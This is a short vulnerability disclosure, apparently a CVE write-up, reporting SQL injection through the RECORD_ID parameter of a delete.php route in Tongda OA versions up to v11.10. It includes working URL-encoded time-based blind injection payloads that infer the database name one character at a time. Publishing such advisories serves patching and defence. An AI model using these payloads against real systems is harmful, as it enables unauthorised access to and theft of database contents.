SQL injection vulnerability exists in Tongda OA

verison:v2017 and versions below v11.10

Route: general/hr/training/record/delete.php

There is an injected parameter: $RECORD_ID

The code here is very concise. When $RECORD_ID is not empty, the parameters are directly spliced ​​into the SQL statement. Since the brackets are closed here, there is a bypass.

![图片1](https://github.com/Godfather-onec/cve/assets/82714037/5aee2f5f-0182-41e7-9150-f6a0dbe472f7)

We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.
POC
```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)% 20and(1)=(1
```
![图片2](https://github.com/Godfather-onec/cve/assets/82714037/c2d866e8-dded-41d9-8a6e-8a69b7b2f708)

And when we change 116 to 115, there will be no delay, indicating the existence of SQL injection.

1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)% 20and(1)=(1

![图片3](https://github.com/Godfather-onec/cve/assets/82714037/9783858e-7df4-4782-8e5c-a73eb72ee857)
